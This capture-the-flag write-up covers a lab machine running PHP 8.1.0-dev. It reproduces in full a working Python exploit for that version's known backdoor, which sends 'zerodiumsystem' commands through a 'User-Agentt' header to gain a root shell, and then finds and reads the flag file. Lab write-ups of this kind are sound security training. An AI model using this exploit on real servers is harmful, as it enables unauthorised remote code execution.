## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Agent T uncovered this website, which looks innocent enough, but something seems off about how the server responds...

After deploying the vulnerable machine attached to this task, please wait a couple of minutes for it to respond.
```

## IP-Address
```IP
10.10.130.220
```
Star with `Rustscan`
```bash 
rustscan -a 10.10.130.220
PORT   STATE     SERVICE        VERSION
80/tcp open       http           PHP cli server 5.5 or later (PHP 8.1.0-dev)
|_http-title:  Admin Dashboard
```
By searching that PHP CLI Version on `Exploit-db` I found an backdoor vulnerability 
those code is this
```python
#!/usr/bin/env python3
import os
import re
import requests

host = input("Enter the host url:\n")
request = requests.Session()
response = request.get(host)

if str(response) == '<Response [200]>':
    print("\nInteractive shell is opened on", host, "\nCan't acces tty; job crontol turned off.")
    try:
        while 1:
            cmd = input("$ ")
            headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "User-Agentt": "zerodiumsystem('" + cmd + "');"
            }
            response = request.get(host, headers = headers, allow_redirects = False)
            current_page = response.text
            stdout = current_page.split('<!DOCTYPE html>',1)
            text = print(stdout[0])
    except KeyboardInterrupt:
        print("Exiting...")
        exit

else:
    print("\r")
    print(response)
    print("Host is not available, aborting...")
    exit
```
which is run in bash 
```bash 
nano new.py 
root@ip-10-10-224-167:~# python3 new.py 
Enter the host url:
http://10.10.130.220/

Interactive shell is opened on http://10.10.130.220/ 
Can't acces tty; job crontol turned off.
$ whoami
root
```
after that we investigate into the machine to get the flag and we directly search for the flag file in to the system 

```bash 
find / -type f -iname "*flag*" 2>/dev/null
/sys/devices/platform/serial8250/tty/ttyS19/flags
/sys/devices/platform/serial8250/tty/ttyS27/flags
/sys/devices/platform/serial8250/tty/ttyS17/flags
/sys/devices/platform/serial8250/tty/ttyS8/flags
/sys/devices/platform/serial8250/tty/ttyS25/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/eth0/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/flag.txt
```
then we just use cat command to print the flag.txt
```bash 
/flag.txt
$ cat /flag.txt
[flag omitted]
```
Then we got that flag 
```flag 
[flag omitted]
```